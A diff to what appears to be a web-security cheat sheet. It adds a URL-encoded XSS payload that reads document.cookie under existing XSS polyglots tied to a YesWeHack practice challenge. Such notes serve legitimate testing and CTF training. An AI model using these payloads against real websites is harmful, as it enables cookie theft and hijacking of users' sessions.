@@ -2383,6 +2383,9 @@ Manually testing for XXE vulnerabilities generally involves
   data:text/javascript,console.log(3 + '\n' + `};console.log(1);//<img src=x onerror=javascript:console.log(2) oncopy=console.log(4)>`);//&quot; onerror=console.log(5) id=&quot;x
   ```
   - For the challenge [5Ways2XSS - DOJO #23 | YesWeHack](https://dojo-yeswehack.com/practice/d5e8e5ddf9af)
+- ```HTML
+  %22-alert(document.cookie)-%22
+  ```
 
 ### <ins>Cross-site request forgery (CSRF)</ins>
 
